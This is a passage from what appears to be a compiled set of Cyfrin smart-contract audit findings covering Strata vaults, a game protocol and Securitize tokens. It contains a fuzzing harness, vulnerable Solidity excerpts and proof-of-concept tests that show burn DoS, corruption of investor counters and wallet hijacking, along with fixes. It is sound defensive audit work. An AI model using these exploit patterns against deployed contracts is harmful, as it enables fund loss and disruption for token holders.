import {MockStakedUSDe} from "contracts/test/MockStakedUSDe.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// echidna . --contract CryticRoundingTester --config echidna_rounding.yaml --format text --workers 16 --test-limit 1000000
contract CryticRoundingTester is BaseSetup, CryticAsserts {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe USDe;
    MockStakedUSDe sUSDe;
    pUSDeVault pUSDe;
    yUSDeVault yUSDe;

    address owner;
    address alice = address(uint160(uint256(keccak256(abi.encodePacked("alice")))));
    address bob = address(uint160(uint256(keccak256(abi.encodePacked("bob")))));
    uint256 severity;

    constructor() payable {
        setup();
    }

    function setup() internal virtual override {
        owner = msg.sender;

        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function target(uint256 aliceDeposit, uint256 bobDeposit, uint256 sUSDeYieldAmount) public {
        aliceDeposit = between(aliceDeposit, 1, 100_000 ether);
        bobDeposit = between(bobDeposit, 1, 100_000 ether);
        sUSDeYieldAmount = between(sUSDeYieldAmount, 1, 500_000 ether);
        precondition(aliceDeposit <= 100_000 ether);
        precondition(bobDeposit <= 100_000 ether);
        precondition(sUSDeYieldAmount <= 500_000 ether);

        // fund users
        USDe.mint(alice, aliceDeposit);
        USDe.mint(bob, bobDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), aliceDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), bobDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);
        vm.stopPrank();

        // setup assertions
        eq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        eq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(owner);
            USDe.mint(owner, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe_actual = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        // bob redeems from yUSDe
        uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
        vm.prank(bob);
        uint256 bobRedeemed_pUSDe_reported = yUSDe.redeem(bobShares_yUSDe, bob, bob);
        uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
        uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

        // optimize
        if (aliceRedeemed_USDe_actual > aliceDeposit) {
            uint256 diff = aliceRedeemed_USDe_actual - aliceDeposit;
            if (diff > severity) {
                severity = diff;
            }
        }
    }

    function echidna_opt_severity() public view returns (uint256) {
        return severity;
    }
}
```

Config:
```yaml
testMode: "optimization"
prefix: "echidna_"
coverage: true
corpusDir: "echidna_rounding"
balanceAddr: 0x1043561a8829300000
balanceContract: 0x1043561a8829300000
filterFunctions: []
cryticArgs: ["--foundry-compile-all"]
deployer: "0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496"
contractAddr: "0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496"
shrinkLimit: 100000
```

Output:
```bash
echidna_opt_severity: max value: 444330
```

**Recommended Mitigation:** Rather than calling `previewWithdraw()` which rounds up, call `convertToShares()` which rounds down:

```solidity
function previewWithdraw(uint256 assets) public view virtual override returns (uint256) {
    return _convertToShares(assets, Math.Rounding.Up);
}

function convertToShares(uint256 assets) public view virtual override returns (uint256) {
    return _convertToShares(assets, Math.Rounding.Down);
}
```

**Strata:** Fixed in commit [59fcf23](https://github.com/Strata-Money/contracts/commit/59fcf239a9089d14f02621a7f692bcda6c85690e).

**Cyfrin:** Verified. The sUSDe to transfer out to the receiver is now calculated using `convertToShares()` which rounds down.

\clearpage

## [M-73] `DefaultSession::assertResults` should revert if `proposedWinners`, `totalXPs` and `totalTimes` array lengths don't match
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `DefaultSession::assertResults` should revert if `proposedWinners`, `totalXPs` and `totalTimes` array lengths don't match.

**Impact:** If an asserter makes a mistake passing different length of `proposedWinners`, `totalXPs` and `totalTimes`, the asserter will loss their bond.

**Recommended Mitigation:** Check that `proposedWinners`, `totalXPs` and `totalTimes` have the same length.

**Majestic Games:**
Fixed in commit [aafd672](https://github.com/Engage-Protocol/engage-protocol/commit/aafd672a20ba8771c36a860fd8b9b59ab966a594).

**Cyfrin:** Verified.

## [M-74] `MajorityChoicePrompt`, `SPBinaryPrompt` and `TriviaChoicePrompt` will not work correctly when used with different instances of `SessionManager`
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `MajorityChoicePrompt` is supposed to support multiple instances of `SessionManager`, however every instance of `SessionManager` starts with `QuestionManager::nextQuestionId = 0`.

This is problematic as `MajorityChoicePrompt::revealReaction` does this:
```solidity
Reaction storage r = reactions[_questionId][_user];
require(!r.baseReaction.reactions[_questionId][_user], AnswerAlreadyRevealed(_user, _gameId, _questionId));
```

When a user plays `questionId = 0` on the first instance of `SessionManager` everything will work ok and `reactions[_questionId][_user].revealed` will be set to `true`.

If that same user plays `questionId = 0` on a second instance of `SessionManager` which uses the same instance of `MajorityChoicePrompt`, then `MajorityChoicePrompt::revealReaction` will revert with `AnswerAlreadyRevealed`.

Another potential issue is that `results[questionId][player]` will have valid results stored for a player from games on the first instance and this mapping doesn't differentiate between the different instances of `SessionManager`.

**Recommended Mitigation:** The simplest fix is that each `SessionManager` instances gets its own fresh `MajorityChoicePrompt` instance; the same issue likely affects `SPBinaryPrompt` and `TriviaChoicePrompt`.

Another option is that:
* there should only be 1 active instance of `SessionManager` at one time
* when a new instance of `SessionManager` is made active, it should be initialized with `gameId`, `sessionId` and `questionId` that are greater than the previous active instance
* add tests to the test suite which exercise this exact scenario to ensure everything will continue to work as expected

**Majority Games:**
Fixed in commits [4b151db](https://github.com/Engage-Protocol/engage-protocol/commit/4b151db34ae5e0adb59076e472f292cfbeb9f571), [46d00d3](https://github.com/Engage-Protocol/engage-protocol/commit/46d00d3096a86694ccfa2b6ddec2ba90265e6ba2), [35c63e7](https://github.com/Engage-Protocol/engage-protocol/commit/35c63e77e829f48d6bb6b74bf6f3f5446399ec9b).

**Cyfrin:** Verified.

## [M-75] If zero xp is earned by all users, once game has concluded `SessionManager::claimRewards` panic reverts due to division by zero but game also can't be cancelled resulting in locked tokens
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `ProportionalToXPReward::getReward` divides by `totalXP`, but if none of the users have earned XP, this will panic revert due to division by zero:
```solidity
uint256 userXP;
uint256 totalXP;
for (uint256 i; i < winners.length; ++i) {
    (, uint256 xp,) = sessionStrategy.userResult(sessionId, winners[i]);
    if (i == position) {
        userXP = xp;
    }
    totalXP += xp;
}
reward = userXP * prizePool / totalXP;
```

`DefaultSession::setXPTiers` does not enforce non-zero xp tiers, it only enforces that at least two tiers must exist:
```solidity
function setXPTiers(uint256 gameId, uint256[] calldata _xpTiers) external {
    require(
        msg.sender == SessionManager(sessionManager).getCreator(gameId),
        NotGameCreator(SessionManager(sessionManager).getCreator(gameId), msg.sender)
    );
    require(_xpTiers.length >= 2, ArrayLengthMismatch());
    require(xpTiers[gameId].length == 0, XpTiersAlreadySet(gameId));
    require(SessionManager(sessionManager).getSessionState(gameId) == SessionState.Created, GameNotCreated(gameId));
    xpTiers[gameId] = _xpTiers;
    emit XpTiersSet(gameId, _xpTiers);
}
```

**Impact:** If zero xp is earned by all users, once game has concluded `SessionManager::claimRewards` panic reverts due to division by zero but game also can't be cancelled because it is in the `Concluded` state, resulting in locked tokens.

**Recommended Mitigation:** Consider enforcing minimum value of 1 for every xp tier in `DefaultSession::setXPTiers`.

**Majority Games:**
Fixed in commit [951a454](https://github.com/Engage-Protocol/engage-protocol/commit/951a45490d2867f80dbf56bb4ce915c44a9a1281) by enforcing non-zero values for every xp tier and also capping xp tiers to max 20.

**Cyfrin:** Verified.

## [M-76] Zero `curvePriceWad` from rounding causes incorrect pricing or denial of service
- Severity: `Medium`
- Source report: `ramp.md`

### Detailed Content (from source)
**Description:** The curve price calculation in `SecuritizeAmmNavProvider::_curveBuy` can round to zero when reserves become imbalanced:
```solidity
curvePriceWad = (amountInQuote * WAD) / deltaBase;
```

Mathematically, this simplifies to:
```solidity
curvePriceWad = WAD * (quoteReserves + amountInQuote) / baseReserves

// Proof of simplification:
// Step 1: Expand `deltaBase`
newQuote = Y + amountInQuote

newBase = k / newQuote
        = (X * Y) / (Y + amountInQuote)

deltaBase = X - newBase
          = X - (X * Y) / (Y + amountInQuote)

// Step 2: Find common denominator
deltaBase = X * (Y + amountInQuote) / (Y + amountInQuote) - (X * Y) / (Y + amountInQuote)
          = (X * Y + X * amountInQuote - X * Y) / (Y + amountInQuote)
          = (X * amountInQuote) / (Y + amountInQuote)

// Step 3: Substitute into curvePriceWad
curvePriceWad = (amountInQuote * WAD) / deltaBase
              = (amountInQuote * WAD) / [(X * amountInQuote) / (Y + amountInQuote)]
              = (amountInQuote * WAD) * (Y + amountInQuote) / (X * amountInQuote)
              = WAD * (Y + amountInQuote) / X

Since X = baseReserves, Y = quoteReserves therefore:
curvePriceWad = WAD * (quoteReserves + amountInQuote) / baseReserves
```

For `curvePriceWad` to round to zero:
```solidity
// WAD = 1e18 gives:
1e18 * (quoteReserves + amountInQuote) < baseReserves
```

This state is reachable through repeated sell operations which increase `baseReserves` while depleting `quoteReserves`. For example, if `quoteReserves = 1` and `amountInQuote = 1`, the condition becomes `baseReserves > 2e18`.

When `curvePriceWad` rounds down to zero and is subsequently passed to `_pricingFromCurveBuy`:
```solidity
uint256 r0Wad = (quoteBaseline * WAD) / baseBaseline;
uint256 mWad = (curvePriceWad * WAD) / r0Wad;  // @audit 0

uint256 baseExecPriceWad = (anchorPriceWad * mWad) / WAD;  // @audit 0

// @audit Since 0 < anchorPriceWad, enter the `else` statement:
uint256 diff = anchorPriceWad - baseExecPriceWad;  // @audit = anchorPriceWad
execPriceWad = anchorPriceWad - (diff / priceScaleFactor);

// @audit With default `priceScaleFactor = 2`:
execPriceWad = anchorPriceWad - anchorPriceWad/2 = anchorPriceWad/2

// With `priceScaleFactor = 1`:
execPriceWad = anchorPriceWad - anchorPriceWad = 0
baseOut = (amountInQuote * WAD) / execPriceWad;  // Division by zero → REVERT
```

The same issue exists in `_curveSell`:
```solidity
curvePriceWad = (deltaQuote * WAD) / amountInBase;
```

If `baseReserves` is small and `quoteReserves` is large (from repeated buys), a sell with large `amountInBase` produces tiny `deltaQuote`, rounding `curvePriceWad` to zero.

**Impact:** Two distinct failure modes depending on `priceScaleFactor`:

| Condition | Result |
|-----------|--------|
| `curvePriceWad = 0`, `scaleFactor ≥ 2` | Buyer receives tokens at ~50% of anchor price; seller receives ~50% premium |
| `curvePriceWad = 0`, `scaleFactor = 1` | Division by zero causes permanent DoS for affected trade direction |

A router contract relying on these prices would transfer incorrect token amounts, potentially causing loss of funds for liquidity providers or the protocol.

**Recommended Mitigation:** Add minimum curve price validation in both curve functions to protect against the case where `curvePriceWad` rounds down to zero:
```diff
function _curveBuy(uint256 amountInQuote) internal view initialized returns (uint256 curvePriceWad, uint256 newBase, uint256 newQuote) {
    require(amountInQuote > 0, "amountInQuote=0");

    uint256 X = baseReserves;
    uint256 Y = quoteReserves;
    uint256 kLocal = k;

    newQuote = Y + amountInQuote;
    newBase = kLocal / newQuote;

    uint256 deltaBase = X - newBase;
    require(deltaBase > 0, "deltaBase=0");

    curvePriceWad = (amountInQuote * WAD) / deltaBase;
+   require(curvePriceWad > 0, "curvePriceWad=0");
}

function _curveSell(uint256 amountInBase) internal view initialized returns (uint256 curvePriceWad, uint256 newBase, uint256 newQuote) {
    require(amountInBase > 0, "amountInBase=0");

    uint256 X = baseReserves;
    uint256 Y = quoteReserves;
    uint256 kLocal = k;

    newBase = X + amountInBase;
    newQuote = kLocal / newBase;

    uint256 deltaQuote = Y - newQuote;
    require(deltaQuote > 0, "deltaQuote=0");

    curvePriceWad = (deltaQuote * WAD) / amountInBase;
+   require(curvePriceWad > 0, "curvePriceWad=0");
}
```

Additionally, consider enforcing a minimum `priceScaleFactor` of 2 to prevent division-by-zero in the pricing functions:
```solidity
function setPriceScaleFactor(uint256 newScaleFactor) external onlyRole(DEFAULT_ADMIN_ROLE) {
-   require(newScaleFactor > 0, "scaleFactor = 0");
+   require(newScaleFactor >= 2, "scaleFactor must be >= 2");

    uint256 oldScaleFactor = priceScaleFactor;
    priceScaleFactor = newScaleFactor;

    emit PriceScaleFactorUpdated(oldScaleFactor, newScaleFactor);
}
```

**Securitize:** Fixed in commit [bcd6e87](https://bitbucket.org/securitize_dev/bc-nav-provider-sc/commits/bcd6e87a866f83ed33b468b9dd2acebac9eca1fd).

**Cyfrin:** Verified.

## [M-77] `RegistryService::addWallet` should revert if the wallet being added has positive balance of `DSToken`
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** `RegistryService::addWallet` doesn't update investor wallet or total balances if it is used to add a wallet that already has a positive `DSToken` balance.

Using it to add a wallet with a positive balance results in a number of incorrect states:

#### Compliance Validation Problems ####
* Investor might not be counted in total investors
* Won't trigger investor limit checks
* Could bypass US/EU investor limits

#### Transfer Validation Problems ####
* Compliance checks expect investor balance to match wallet balance
* Some checks compare investor balance to transfer amount
* Could trigger incorrect "new investor" logic
* Transfers could revert due to underflow when subtracting from existing internal wallet / investor balances resulting in the tokens being stuck

**Recommended Mitigation:** `RegistryService::addWallet` should revert if the wallet being added has positive balance of `DSToken`. The same applies to `addWalletByInvestor` but that function is being removed.

Alternatively another option is to register the existing tokens for the investor by calling `DSToken::updateInvestorBalance` and `addWalletToList` though these functions are currently private.

**Securitize:** Fixed in commit [3e9c754](https://github.com/securitize-io/dstoken/commit/3e9c754c6e11866884457cedfa46dd55d5b6bc2a) by preventing adding wallets with positive balance.

**Cyfrin:** Verified.

\clearpage

## [M-78] Burn and seize functions can be DoS when investor has several wallets that they control
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** The `burn` function in `TokenLibrary.sol` checks `walletsBalances[_who]` (individual wallet balance, see the arrow above) instead of `investorsBalances[investorId]` (total investor balance across all wallets). This allows investors with multiple registered wallets to make their tokens unburnable by transferring tokens between their own wallets.

```solidity
function burn(
        TokenData storage _tokenData,
        address[] memory _services,
        address _who,
        uint256 _value,
        ISecuritizeRebasingProvider _rebasingProvider
    ) public returns (uint256) {
        uint256 sharesToBurn = _rebasingProvider.convertTokensToShares(_value);

        require(sharesToBurn <= _tokenData.walletsBalances[_who], "Not enough balance"); <---------

        IDSComplianceService(_services[COMPLIANCE_SERVICE]).validateBurn(_who, _value);

        _tokenData.walletsBalances[_who] -= sharesToBurn;
        updateInvestorBalance(
            _tokenData,
            IDSRegistryService(_services[REGISTRY_SERVICE]),
            _who,
            sharesToBurn,
            CommonUtils.IncDec.Decrease
        );

        _tokenData.totalSupply -= sharesToBurn;
        return sharesToBurn;
    }

```

When an investor transfers tokens from their original wallet to another wallet they control, the burn function will fail with "Not enough balance" even though the investor still owns the tokens in their total balance.

**Impact:** If the admin doesn't use private mempools when performing sensitive operations such as burn or seize, investors can front-run to temporarily prevent token burning by transferring tokens between their own wallets.

**Proof of Concept:** Run the next proof of concept in `dstoken-regulated.test.ts`:

```typescript
describe('Burn DoS Vulnerability POC', function() {
        it('Should demonstrate that burn can be DoS by transferring between investor wallets', async function() {
          const [investor, wallet2, wallet3] = await hre.ethers.getSigners();
          const { dsToken, registryService } = await loadFixture(deployDSTokenRegulatedWithRebasingAndEighteenDecimal);

          // Register investor with multiple wallets
          await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, investor.address, registryService);
          await registryService.addWallet(wallet2.address, INVESTORS.INVESTOR_ID.INVESTOR_ID_1);
          await registryService.addWallet(wallet3.address, INVESTORS.INVESTOR_ID.INVESTOR_ID_1);

          // Issue tokens to investor
          await dsToken.issueTokens(investor.address, 1000);

          // Transfer tokens between investor's own wallets
          await dsToken.connect(investor).transfer(wallet2.address, 1000);

          // Now investor has 0 balance in original wallet but 1000 total
          expect(await dsToken.balanceOf(investor.address)).to.equal(0);
          expect(await dsToken.balanceOfInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1)).to.equal(1000);

          // VULNERABILITY: Burn fails because wallet balance is 0, even though investor has tokens
          await expect(dsToken.burn(investor.address, 100, 'DoS test'))
            .to.be.revertedWith('Not enough balance');
        });
      });

```

**Recommended Mitigation:** Possible mitigation options include:
* perform sensitive admin transactions such as burn and seize through private mempool services like [flashbots](https://docs.flashbots.net/flashbots-protect/overview) so they can't be front-run
* remove the `addWalletByInvestor` function to prevent investors from continually adding more wallets and distributing their tokens to them
* add `burnAll` and `seizeAll` functions to `DSToken` which iterate over every wallet belonging to an investor and burn/seize all their tokens

**Securitize:** Fixed in commit [05c5bad](https://github.com/securitize-io/dstoken/commit/05c5bada3c2801b1333fc96f4abc5226a84471f0) by removing `addWalletByInvestor`. Operations team to consider advice regarding running sensitive admin transactions via private mempools.

**Cyfrin:** Verified.

## [M-79] Investors transferring all their balances among their wallets or self-transferring on the same wallet causes to incorrectly decrement the investor counters causing DoS for other investors transfers
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** `ComplianceServiceRegulated::recordTransfer()` is in charge of adjusting the investor counters when the receiver's investor is new, or the sender's investor is transferring all of its balance, but there are edge cases that cause the investor counters to be incorrectly decremented.
1. The first edge case is when an existing investor transfers all their balance from one wallet to another.
2. An investor executing self-transfers from the same wallet.

The root cause of the problem is found in the `ComplianceServiceRegulated::recordTransfer()`, the function does not check if the sender and receiver investor are the same, and it straight checks if the sender's investor is transferring all of his balance, regardless of whether the receiver is the same investor.
```solidity
    function compareInvestorBalance(
        address _who,
        uint256 _value,
        uint256 _compareTo
    ) internal view returns (bool) {
       //@audit => true when the sender is transferring all of its balance
        return (_value != 0 && getToken().balanceOfInvestor(getRegistryService().getInvestor(_who)) == _compareTo);
    }

    function recordTransfer(
        address _from,
        address _to,
        uint256 _value
    ) internal override returns (bool) {
//@audit-issue => Not checking if sender is the same as the receiver

        if (compareInvestorBalance(_to, _value, 0)) {
            adjustTransferCounts(_to, CommonUtils.IncDec.Increase);
        }

        if (compareInvestorBalance(_from, _value, _value)) {
//@audit=> When from's investor transfers all of its balance, investor counters are decremented.
            adjustTotalInvestorsCounts(_from, CommonUtils.IncDec.Decrease);
        }

        ...
    }

```

**Impact:**
- Investor counters will be decremented when they should not be, leading to DoS transfers for other investors.
- An additional impact is that investor limits can be bypassed because the investor counters won't correctly track the real number of investors in the system.

**Proof of Concept:** Add the PoCs to `dstoken-regulated.test.ts`. First PoC demonstrates the problem by transferring among the wallets of the same investor:
```javascript
    it.only('Mess up counters via transfers among wallets owned by the same investor', async function () {
      const [owner, wallet1Investor1, wallet2Investor1, walletInvestor2, walletInvestor3] = await hre.ethers.getSigners();
      const { dsToken, registryService, complianceConfigurationService, lockManager, complianceService } = await loadFixture(deployDSTokenRegulated);

      await complianceConfigurationService.setCountryCompliance(INVESTORS.Country.USA, INVESTORS.Compliance.US);
      await complianceConfigurationService.setUSInvestorsLimit(10);

      await registryService.registerInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID, '');
      await registryService.registerInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2, '');
      await registryService.registerInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_3, '');

      await registryService.setCountry(INVESTORS.INVESTOR_ID.US_INVESTOR_ID, INVESTORS.Country.USA);
      await registryService.setCountry(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2, INVESTORS.Country.USA);
      await registryService.setCountry(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_3, INVESTORS.Country.USA);

      await registryService.addWallet(wallet1Investor1, INVESTORS.INVESTOR_ID.US_INVESTOR_ID);//wallet1Investor1 => US_INVESTOR_ID
      await registryService.addWallet(wallet2Investor1, INVESTORS.INVESTOR_ID.US_INVESTOR_ID);//wallet2Investor1 -> US_INVESTOR_ID

      await registryService.addWallet(walletInvestor2, INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2);//walletInvestor2 -> US_INVESTOR_ID_2
      await registryService.addWallet(walletInvestor3, INVESTORS.INVESTOR_ID.US_INVESTOR_ID_3);//walletInvestor3 -> US_INVESTOR_ID_3

      const currentTime = await time.latest();

      //@audit-info => Issue unlocked tokens to investors

      await dsToken.issueTokensCustom(wallet1Investor1, 10_000, currentTime, 0, 'TEST', 0);
      await dsToken.issueTokensCustom(walletInvestor2, 10_000, currentTime, 0, 'TEST', 0);
      await dsToken.issueTokensCustom(walletInvestor3, 10_000, currentTime, 0, 'TEST', 0);

      expect(await complianceService.getUSInvestorsCount()).equal(3);
      expect(await complianceService.getTotalInvestorsCount()).equal(3);

      //@audit-info => investor1 transfers all the balance among his wallets
      const dsTokenWallet1Investor1 = await dsToken.connect(wallet1Investor1);
      const dsTokenWallet2Investor1 = await dsToken.connect(wallet2Investor1);

      await dsTokenWallet1Investor1.transfer(wallet2Investor1, 10_000);
      await dsTokenWallet2Investor1.transfer(wallet1Investor1, 10_000);
      await dsTokenWallet1Investor1.transfer(wallet2Investor1, 10_000);

      //@audit-issue => Investor counters have been brought down to 0 while the 3 investors still have balances!
      expect(await complianceService.getUSInvestorsCount()).equal(0);
      expect(await complianceService.getTotalInvestorsCount()).equal(0);

      expect(await dsToken.balanceOfInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID)).equal(10_000);
      expect(await dsToken.balanceOfInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2)).equal(10_000);
      expect(await dsToken.balanceOfInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_3)).equal(10_000);

      //@audit-info => Will revert because investor counter has been brought down to 0
      const dsTokenWalletInvestor2 = await dsToken.connect(walletInvestor2);
      await expect(dsTokenWalletInvestor2.transfer(walletInvestor3, 10_000)).to.be.revertedWith('Not enough investors');
    });
```

The second PoC demonstrates the problem by self-transferring on the same wallet:
```javascript
    it.only('self transfer from the same wallet messes up investor counters', async function () {
      const [owner, wallet1Investor1, wallet2Investor1, walletInvestor2, walletInvestor3] = await hre.ethers.getSigners();
      const { dsToken, registryService, complianceConfigurationService, lockManager, complianceService } = await loadFixture(deployDSTokenRegulated);

      await complianceConfigurationService.setCountryCompliance(INVESTORS.Country.USA, INVESTORS.Compliance.US);
      await complianceConfigurationService.setUSInvestorsLimit(10);

      await registryService.registerInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID, '');
      await registryService.registerInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2, '');
      await registryService.registerInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_3, '');

      await registryService.setCountry(INVESTORS.INVESTOR_ID.US_INVESTOR_ID, INVESTORS.Country.USA);
      await registryService.setCountry(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2, INVESTORS.Country.USA);
      await registryService.setCountry(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_3, INVESTORS.Country.USA);

      await registryService.addWallet(wallet1Investor1, INVESTORS.INVESTOR_ID.US_INVESTOR_ID);//wallet1Investor1 => US_INVESTOR_ID

      await registryService.addWallet(walletInvestor2, INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2);//walletInvestor2 -> US_INVESTOR_ID_2
      await registryService.addWallet(walletInvestor3, INVESTORS.INVESTOR_ID.US_INVESTOR_ID_3);//walletInvestor3 -> US_INVESTOR_ID_3

      const currentTime = await time.latest();

      //@audit-info => Issue unlocked tokens to investors

      await dsToken.issueTokensCustom(wallet1Investor1, 10_000, currentTime, 0, 'TEST', 0);
      await dsToken.issueTokensCustom(walletInvestor2, 10_000, currentTime, 0, 'TEST', 0);
      await dsToken.issueTokensCustom(walletInvestor3, 10_000, currentTime, 0, 'TEST', 0);

      expect(await complianceService.getUSInvestorsCount()).equal(3);
      expect(await complianceService.getTotalInvestorsCount()).equal(3);

      //@audit-info => investor1 transfers all the balance among his wallets
      const dsTokenWallet1Investor1 = await dsToken.connect(wallet1Investor1);

      await dsTokenWallet1Investor1.transfer(wallet1Investor1, 10_000);
      await dsTokenWallet1Investor1.transfer(wallet1Investor1, 10_000);
      await dsTokenWallet1Investor1.transfer(wallet1Investor1, 10_000);

      //@audit-issue => Investor counters have been brought down to 0 while the 3 investors still have balances!
      expect(await complianceService.getUSInvestorsCount()).equal(0);
      expect(await complianceService.getTotalInvestorsCount()).equal(0);

      expect(await dsToken.balanceOfInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID)).equal(10_000);
      expect(await dsToken.balanceOfInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_2)).equal(10_000);
      expect(await dsToken.balanceOfInvestor(INVESTORS.INVESTOR_ID.US_INVESTOR_ID_3)).equal(10_000);

      //@audit-info => Will revert because investor counter has been brought down to 0
      const dsTokenWalletInvestor2 = await dsToken.connect(walletInvestor2);
      await expect(dsTokenWalletInvestor2.transfer(walletInvestor3, 10_000)).to.be.revertedWith('Not enough investors');
    });
```

**Recommended Mitigation:** Consider skipping the check and decrement of investor counters when the investor of the `from` and `receiver` wallets is the same:
```diff
    function recordTransfer(
        address _from,
        address _to,
        uint256 _value
    ) internal override returns (bool) {
        if (compareInvestorBalance(_to, _value, 0)) {
            adjustTransferCounts(_to, CommonUtils.IncDec.Increase);
        }

-       if (compareInvestorBalance(_from, _value, _value)) {
-           adjustTotalInvestorsCounts(_from, CommonUtils.IncDec.Decrease);
-       }

+       string memory investorFrom = getRegistryService().getInvestor(_from);
+       string memory investorTo = getRegistryService().getInvestor(_to);

+       if(!CommonUtils.isEqualString(investorFrom, investorTo)) {
+           if (compareInvestorBalance(_from, _value, _value)) {
+               adjustTotalInvestorsCounts(_from, CommonUtils.IncDec.Decrease);
+           }
+       }

        cleanupInvestorIssuances(_from);
        cleanupInvestorIssuances(_to);
        return true;
    }
```

A more gas optimized version of this fix would be to refactor the functions `compareInvestorBalance` and `cleanupInvestorIssuances` to take the investor id as input as opposed to receiving the wallet address and internally getting the investor id on each function.

**Securitize:** Fixed in commit [6b94242](https://github.com/securitize-io/dstoken/commit/6b94242f913d5c5b94e5dd50ed7cf84723f2a8a1).

**Cyfrin:** Verified.

\clearpage

## [M-80] Malicious investor can register wallets that belong to other investors
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** The `addWalletByInvestor` function in `RegistryService.sol` allows any registered investor to claim ownership of any wallet address that is not currently in the `investorsWallets` mapping. This creates a critical vulnerability where attackers can front-run legitimate wallet registration transactions to hijack wallet ownership:

```solidity
function addWalletByInvestor(address _address) public override newWallet(_address) returns (bool) {
        require(!getWalletManager().isSpecialWallet(_address), "Wallet has special role");

        string memory owner = getInvestor(msg.sender);
        require(isInvestor(owner), "Unknown investor");

        investorsWallets[_address] = Wallet(owner, msg.sender, msg.sender);
        investors[owner].walletCount++;

        emit DSRegistryServiceWalletAdded(_address, owner, msg.sender);

        return true;
    }

```
The function only checks that the caller is a registered investor and that the wallet is not a special wallet, but does not verify that the caller actually controls the wallet address being registered.

With that being say a malicious register investor can front run ( or if he already know what wallet will be registered) any `addWallet`, `updateInvestor`, and `addWalletByInvestor` call setting the wallet to himself DoSing those function and possible Redirect token issuances meant for other investors to themselves.


**Impact:** *  `addWallet`, `updateInvestor`, `addWalletByInvestor` in the registry and ` TokenIssuer:issueTokens` and `SecuritySwap:swap` functions can be DoS.

* Since the token issuant process is using those wallets to mint tokens( see `issueTokensCustom` )

```solidity
